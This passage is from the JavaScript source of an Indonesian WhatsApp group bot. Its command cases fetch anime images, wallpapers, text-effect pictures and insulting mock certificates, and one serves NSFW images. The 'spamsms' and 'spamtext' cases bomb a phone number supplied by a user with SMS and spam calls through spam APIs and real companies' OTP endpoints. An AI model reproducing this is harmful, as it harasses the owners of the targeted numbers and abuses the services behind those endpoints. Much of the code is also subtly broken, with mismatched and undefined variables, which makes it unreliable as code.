					const sips = pushname[Math.floor(Math.random() *   msk.length)]
					teks = `Yang paling Cantik disini Adalah : @${siaps.jid.split('@')[0]}`
					membr.push(siaps.jid)
					mentions(teks, membr, true)
					break
			case 'gecg':
				    try {
					if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
						axios.get(`https://nekos.life/api/v2/img/gecg`).then((res)=>{
						imageToBase64(res.data.url).then((response) => {var buf = kontol.from(response, 'base64');
					aldi.sendMessage(from, buf, image, {quoted: ftoko,caption: "..."})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ ERROR ❌')
					}
					break
                case 'avatar':
				    try {
					   if (!isGroup) return reply(aml.groupo)
					   if (!isRegistered) return reply(aml.noregis)
		                if (isBanned) return reply(aml.baned)
						axios.get(`https://nekos.life/api/v2/img/avatar`).then((res)=>{
						imageToBase64(res.data.url).then((response) => {var buf = kontol.from(response, 'base64');
					aldi.sendMessage(from, buf, image, {quoted: ftoko,caption: "..."})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ ERROR ❌')
					}
					break
			case 'wallpapernime':
				    try {
					if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
						axios.get(`https://nekos.life/api/v2/img/wallpaper`).then((res)=>{
						imageToBase64(res.data.url).then((response) => {var buf = kontol.from(response, 'base64');
					aldi.sendMessage(from, buf, image, {quoted: ftoko,caption: "Nih om"})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ ERROR ❌')
					}
					break
			case 'wallpaperty':
			        if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply (aml.wait)
					paper = body.slice(7)
					u = await fetchJson(`http://api.lolhuman.xyz/api/wallpaper/querty=${paper}?apikey=${lolhuman}`, {method: 'get'})
					var per = JSON.parse(JSON.stringify(u.result));
					var trest =  pin[Math.floor(Math.random() *   per.length)];
					pinehg = await getBuffer(trest)
					aldi.sendMessage(from, pinehg, image, { caption: 'Wallpaper\n\nHasil Pencarian : '+paper+'', quoted: fkontak })
					break
         
			case 'amv':
			     if (!isGroup) return reply(aml.groupo)
				 aldi.updatePresence(from, Presence.composing) 
			     reply(aml.wait)
				 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
				 data = fs.readFileSync('./aldiganz/amv.js');
                var jsonData = JSON.parse(data);
                 var randIndex = Math.floor(Math.random() * jsonData.length);
                randKey = jsonData[randIndex];
                hasil = await getBuffer(randKey.result)
                aldi.sendMessage(from, data, video,{ mimetype: 'video/mp4', quoed: freply})
				break
              
		case 'panah':
		  const hasilburuann = hasilburuan[Math.floor(Math.random() *   hasilburuan.length)]
                    if (args.length < 1) return reply(` CONTOH\n${prefix + command} hmm`)
                    ini = body.slice(6)
                    setTimeout( () => {
                    reply(`[ PERINTAH DILAKSANAKAN ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ ${command +  ini} ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ SEDANG BERBURU ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ SUKSES !! DAN ANDA MENDAPATKAN ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`[ WOW ANDA MENDAPATKAN ]\n[ ${hasilburuann} ]`)
                    }, 20000)
                    break
					case 'slot':
            const slottt = slott[Math.floor(Math.random() *   slott.length)]
            const slote = slotnohoki[Math.floor(Math.random() *   slotnohoki.length)]
            aldi.sendMessage(from, `[ SLOTS ]\n\n${slote}\n${slottt}\n${slote}\n\n[ SLOTS ]`, text, { quoted: fkontak })
            break
			case 'runtime':
			    if (!isGroup) return reply(aml.groupo)
		        if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
				aldi.updatePresence(from, Presence.composing, cr) 
				uptime = process.uptime()
				reply(`Bot Telah Aktif Selama\n${kyun(uptime)}`)
				break
			case 'husbu2':
			             if (!isGroup) return reply(aml.groupo)
				         aldi.updatePresence(from, Presence.composing) 
					     if (!isRegistered) return reply(aml.noregis)
		                 if (isBanned) return reply(aml.baned)
					     data = fs.readFileSync('./aldiganz/husbu.js');
        		         jsonData = JSON.parse(data);
		                 randIndex = Math.floor(Math.random()*  jsonData.length);
		                 randKey = jsonData[randIndex];
		                hasil = await getBuffer(randKey.image)
		                sendImage(hasil, mek, randKey.teks)
				        break
			case 'animesaran2':
			        if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
                    costum( animesaran2(prefix), text, tescuk, vr)
                      break
				case 'ram':
				    if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
                    if (isLimit(sender)) return reply(limits.limitend(pushname))
					anu = await fetchJson(`https://api.vhtear.com/pinterest?query=ramrezero&apikey=${apivhtear}`, {method: 'get'})
					var mi = JSON.parse(JSON.stringify(anu.result));
					var ku =  mi[Math.floor(Math.random() *  mi.length)];
					nye = await getBuffer(ku)
					aldi.sendMessage(from, nye, image, { caption: 'ram chan!!', quoted: fkontak })
					await limitAdd(sender)
					break
				case 'batle':
				if (!isGroup) return reply(aml.groupo)
				if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
                if (isLimit(sender)) return reply(limits.limitend(pushname))
					gh = `${body.slice(7)}`
					reply (aml.wait)
					gbl1 = gh.split("|")[0];
					gbl2 = gh.split("|")[1];
					if (args.length < 1) return reply('Teksnya mana kak?')
					data = await getBuffer(`https://ferdiz-api.herokuapp.com/api/battlefield?text=${gbl1}&text2=${gbl2}`, {method: 'get'})
					kontol = await getBuffer(data.result)
					frhan.sendMessage(from, kontol, image, {quoted: fkontak})
					await limitAdd(sender) 
					break
				case 'ssweb':
				if (!isGroup) return reply(aml.groupo)
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(limits.limitend(pushname))
					if (args.length < 1) return reply('Urlnya mana gan?')
					teks = `${body.slice(7)}`
					reply (aml.wait)
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/screenshotweb?url=${teks}`)
					ssweb = await getBuffer(anu.gambar)
					aldi.sendMessage(from, ssweb, image, {quoted: fkontak})
					await limitAdd(sender)
					break 
				case 'buylimit':
				if (!isGroup) return reply(aml.groupo)
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				payout = args.join('  ')
				const koinPerlimit = 1000
				const total = koinPerlimit* payout
				if ( checkATMuser(sender) <= total) return reply(`maaf uang kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
				if ( checkATMuser(sender) >= total ) {
					confirmATM(sender, total)
					bayarLimit(sender, payout)
					await reply(`「 PEMBAYARAN BERHASIL 」\n\npengirim : Admin\npenerima : ${pushname}\nnominal pembelian : ${payout} \n harga limit : ${koinPerlimit}/limit\n sisa uang mu : ${checkATMuser(sender)}\n\nproses berhasil dengan nomer pembayaran\n${createSerial(15)}`)
				} 
				break
//CASE BADWORD
                 case 'addbadword':
                    if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                                        if (!isOwner) return reply(aml.ownerb)
                                        if (!isGroupAdmins) return reply(aml.admin)
                    if (args.length < 1) return reply( `Kirim perintah ${prefix}addbadword [kata kasar]. contoh ${prefix}addbadword bego`)
                    const bw = body.slice(12)
                    bad.push(bw)
                    fs.writeFileSync('./database/group/bad.json', JSON.stringify(bad))
                    reply('Success Menambahkan Bad Word!')
                    break
                case 'delbadword':
                    if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                                        if (!isOwner) return reply(aml.ownerb)
                                        if (!isGroupAdmins) return reply(aml.admin)
                    if (args.length < 1) return reply( `Kirim perintah ${prefix}addbadword [kata kasar]. contoh ${prefix}addbadword bego`)
                    let dbw = body.slice(12)
                    bad.splice(dbw)
                    fs.writeFileSync('./database/group/bad.json', JSON.stringify(bad))
                    reply('Success Menghapus BAD WORD!')
                    break 
                case 'listbadword':
                    let lbw = `Ini adalah list BAD WORD\nTotal : ${bad.length}\n`
                    for (let i of bad) {
                        lbw += `➸ ${i.replace(bad)}\n`
                    }
                    await reply(lbw)
                    break 
		case 'katakataaldian':
			if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					gatauda = body.slice(7)
					anu = await fetchJson(`https://xptnewapi.000webhostapp.com/newapixptn/katakataaldian.php?apikey=xptn3` , {method: 'get'})
					reply(anu.result)
					break
					case 'katadoi':
					if (!isGroup) return reply(aml.groupo)
			if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					gatauda = body.slice(7)
					anu = await fetchJson(`https://xptnewapi.000webhostapp.com/newapixptn/katadoi.php?apikey=xptn3` , {method: 'get'})
					reply(anu.result)
					break
					case 'hemkel':
					if (!isGroup) return reply(aml.groupo)
			        if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					gatauda = body.slice(7)
					anu = await fetchJson(`https://xptnewapi.000webhostapp.com/newapixptn/katakatahacker.php?apikey=xptn3`, {method: 'get'})
					reply(anu.result)
					break
				
					case 'quoterandom':
					if (!isGroup) return reply(aml.groupo)
			if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					gatauda = body.slice(7)
					anu = await fetchJson(`https://xptnewapi.000webhostapp.com/newapixptn/katastory.php?apikey=xptn3`, {method: 'get'})
					reply(anu.result)
					break
                  case 'nobadword':
                  if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (!isOwner) return reply(aml.ownerb)
					if (!isGroupAdmins) return reply(aml.admin)
                if (args.length < 1) return reply('lel??')
                if (args[0] === 'enable') {
                if (isBadWord) return reply('fitur BadWord sudah aktif tadi!!')
                 	   badword.push(from)
                 	   fs.writeFileSync('./database/group/badword.json', JSON.stringify(badword))
                  	   reply(`badword is enable`)
              	  } else if (args[0] === 'disable') {
                  	  badword.splice(from, 1)
                 	   fs.writeFileSync('./database/group/badword.json', JSON.stringify(badword))
                 	    reply(`badword is disable`)
             	   } else {
                 	   reply(ind.satukos())
                	}
                    break
		//rules
		case 'rules':
                    if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                   costum( rules(prefix), text, tescuk, cr)
                    break
			//randommenu
		case 'spamsms':
		            if (!isGroup) return reply(aml.groupo)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} 08303030303030`)
                    nomor = args[0]
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam1?apikey=${lolhuman}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam2?apikey=${lolhuman}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam3?apikey=${lolhuman}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam4?apikey=${lolhuman}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam5?apikey=${lolhuman}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam6?apikey=${lolhuman}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam7?apikey=${lolhuman}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam8?apikey=${lolhuman}&nomor=${nomor}`)
                    reply("Success")
                    break
        case 'spamtext':
        if (!isGroup) return reply(aml.groupo)
					if (isLimit(sender)) return reply(limits.limitend(pushname))
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                reply('Otw Spam 1x')
                                       if (args[0].startsWith('08')) return reply('Gunakan nomor awalan 8/n ex : 8796662')
                                       if (args[0].startsWith('85648910195')) return reply('Gagal tidak dapat spam nomer bot')
                                       if (args[0].startsWith('85876330812')) return reply('Gagal tidak dapat spam nomer owner')
                                       var data = args.join('  ')
                                       await fetchJson(`https://core.ktbs.io/v2/user/registration/otp/62`+data, {method: 'get'})
                                       await fetchJson(`https://arugaz.herokuapp.com/api/spamcall?no=`+data, {method: 'get'})
                                       await fetchJson(`https://api.danacita.co.id/users/send_otp/?mobile_phone=62`+data, {method: 'get'})
                                       await fetchJson(`https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=0`+data, {method: 'get'})
                                       await fetchJson(`https://zeksapi.herokuapp.com/api/spamcall?no=`+data+`&apikey=${ZeksApi}`, {method: 'get'})
                                       break                           
		case 'googleimage':
		if (!isGroup) return reply(aml.groupo)
				   aldi.updatePresence(from, Presence.composing) 
 				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                                        if (isLimit(sender)) return reply(aml.limitend)
				   if (args.length < 1) return reply('Apa yang mau dicari kak?')
					goo = body.slice(7)
					anu = await fetchJson(`https://api.vhtear.com/googleimg?query=${goo}&apikey=${apivhtear}`, {method: 'get'})
					reply(`Harap Sabar Jangan Spam,Jika Ketahuan Spam Banned Balasannya`)
				    var pol = JSON.parse(JSON.stringify(anu.result.result_search));
                    var tes2 =  pol[Math.floor(Math.random() *   pol.length)];
					pint = await getBuffer(tes2)
					aldi.sendMessage(from, pint, image, {caption: 'Pencarian : '+goo+'', quoted: fkontak })
					await limitAdd(sender)
					break
                    case 'nsfwblowjob':
                    if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                if (isLimit(sender)) return reply(aml.limitend)
                   if (!isGroup) return reply(aml.groupo)
                   if (!isNsfw) return reply(aml.nsfwoff)
                    kontol = await getBuffer(`http://api.lolhuman.xyz/api/random/nsfw/blowjob?apikey=${lolhuman}`)
                    aldi.sendMessage(from, kontol, image, { quoted: fkontak, caption: 'Nih Bro'  })
                    break
		case 'quran':
		if (!isGroup) return reply(aml.groupo)
			if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                        if (isLimit(sender)) return reply(aml.limitend)
				anu = await fetchJson(`https://api.banghasan.com/quran/format/json/acak`, {method: 'get'})
				quran = `${anu.acak.ar.teks}\n\n${anu.acak.id.teks}\nQ.S ${anu.surat.nama} ayat ${anu.acak.id.ayat}`
				aldi.sendMessage(from, quran, text, {quoted: fkontak})
				await limitAdd(sender)
				break
				case 'shadow':
                case 'cup':
                case 'cup1':
                case 'romance':
                case 'smoke':
                case 'burnpaper':
                case 'lovemessage':
                case 'undergrass':
                case 'love':
                case 'coffe':
                case 'woodheart':
                case 'flowerheart':
                case 'woodenboard':
                case 'summer3d':
                case 'wolfmetal':
                case 'nature3d':
                case 'underwater':
                case 'golderrose':
                case 'summernature':
                case 'letterleaves':
                case 'glowingneon':
                case 'fallleaves':
                case 'flamming':
                case 'harrypotter':
                case 'carvedwood':
                if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length == 0) return reply('Teksnya mana um')
                    txt = args.join('  ')
                    taiii = await getBuffer(`http://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${lolhuman}&text=${txt}`)
                    aldi.sendMessage(from, taii, image, {caption: 'Nih kak udah jadi..', quoted: fkontak})
                    break
                case 'wetglass':
                case 'multicolor3d':
                case 'watercolor':
                case 'luxurygold':
                case 'galaxywallpaper':
                case 'lighttext':
                case 'beautifulflower':
                case 'puppycute':
                case 'royaltext':
                case 'heartshaped':
                case 'birthdaycake':
                case 'galaxystyle':
                case 'hologram3d':
                case 'glossychrome':
                case 'greenbush':
                case 'metallogo':
                case 'noeltext':
                case 'glittergold':
                case 'textcake':
                case 'starsnight':
                case 'wooden3d':
                case 'textbyname':
                case 'writegalacy':
                case 'snow3d':
                case 'birthdayday':
                case 'golaldilaybutton':
                case 'silverplaybutton':
                case 'freefire':
                if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length == 0) return reply('Teksnya mana um')
                    txt = args.join('  ')
                    loldah = await getBuffer(`http://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lolhuman}&text=${txt}`)
                    aldi.sendMessage(from, loldah, image, {caption: 'Nih kak udah jadi..', quoted: fkontak})
                    break
                    
                    case 'anakharamserti': 				
				// Subscribe Yoo
            if (!isGroup) return reply(aml.groupo)
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}anakharamserti FvnkyStore`)
				reply (aml.wait)
				ct = body.slice(15)
				anu = await getBuffer(`https://onlydevcity.xyz/AnakHaramSerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
               case 'tololserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}anakharamserti FvnkyStore`)
				reply (aml.wait)
				ct = body.slice(14)
				anu = await getBuffer(`https://bsbt-api-rest.herokuapp.com/api/maker/tololserti?apikey=${Beni}&text=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'hekelserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}hekel FvnkyStore`)
				reply (aml.wait)
				ct = body.slice(11)
				anu = await getBuffer(`https://bsbt-api-rest.herokuapp.com/api/maker/hekelserti/apikey=${Beni}&nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'babuserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}babu FvnkyStore`)
				reply (aml.wait)
				ct = args.join (' ')
				anu = await getBuffer(`https://onlydevcity.xyz/BabuSerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'ffserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}ffserti FvnkyStore`)
				reply (aml.wait)
				ct = body.slice(8)
				anu = await getBuffer(`https://bsbt-api-rest.herokuapp.com/api/maker/ffserti?apikey=${Beni}&text=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'bucinserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}ffserti aldi`)
				reply (aml.wait)
				ct = body.slice(11)
				anu = await getBuffer(`https://onlydevcity.xyz/BucinSerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'bocilepepserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}ffserti aldi`)
				reply (aml.wait)
				ct = body.slice(15)
				anu = await getBuffer(`https://onlydevcity.xyz/CilEpepSerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'gayserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}ffserti aldi`)
				reply (aml.wait)
				ct = body.slice(9)
				anu = await getBuffer(`https://onlydevcity.xyz/GaySerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'pacarserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}ffserti aldi`)
				reply (aml.wait)
				ct = body.slice(11)
				anu = await getBuffer(`https://onlydevcity.xyz/PacarSerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'sadboyserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}ffserti aldi`)
				reply (aml.wait)
				ct = body.slice(12)
				anu = await getBuffer(`https://onlydevcity.xyz/SadBoySerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'surgaserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}ffserti aldi`)
				reply (aml.wait)
				ct = body.slice(11)
				anu = await getBuffer(`https://onlydevcity.xyz/SurgaSerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'pinterserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}ffserti aldi`)
				reply (aml.wait)
				ct = body.slice(12)
				anu = await getBuffer(`https://onlydevcity.xyz/PintarSerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'badgirlserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}badgirlserti ${pushname}`)
				reply (aml.wait)
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/BadGirlSerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'badboyserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}badboyserti aldi`)
				reply (aml.wait)
				ct = body.slice(12)
				anu = await getBuffer(`https://onlydevcity.xyz/BadBoySerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'goodgirlserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}goodgirlserti ${pushname}`)
				reply (aml.wait)
				ct = body.slice(14)
				anu = await getBuffer(`https://onlydevcity.xyz/GoodGirlSerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'goodboyserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}goodboyserti aldi`)
				reply (aml.wait)
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/GoodBoySerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'editodserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}editodberkelasserti ${pushname}`)
				reply (aml.wait)
				ct = body.slice(20)
				anu = await getBuffer(`https://onlydevcity.xyz/EditorBerkelasSerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'goodlookingserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}goodlookingserti aldi`)
				reply (aml.wait)
				ct = body.slice(17)
				anu = await getBuffer(`https://onlydevcity.xyz/GoodLookingSerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'fuckboyserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}fucekboyserti aldi`)
				reply (aml.wait)
				ct = body.slice(14)
				anu = await getBuffer(`https://onlydevcity.xyz/FucekBoySerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'jametserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}fucekboyserti ${pushname}`)
				reply (aml.wait)
				ct = body.slice(11)
				anu = await getBuffer(`https://onlydevcity.xyz/JametSerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'youtuberserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}youtuberserti databaseaUhuy`)
				reply (aml.wait)
				ct = body.slice(14)
				anu = await getBuffer(`https://onlydevcity.xyz/YoutuberSerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'fftourserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}fftourserti databaseaUhuy`)
				reply (aml.wait)
				ct = body.slice(12)
				anu = await getBuffer(`https://onlydevcity.xyz/FFSerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'fftourserti2': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}fftourserti2 databaseaUhuy`)
				reply (aml.wait)
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/FFSerti2/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'fftourserti3': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}fftourserti3 databaseaUhuy`)
				reply (aml.wait)
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/FFSerti3/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'fftourserti4': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
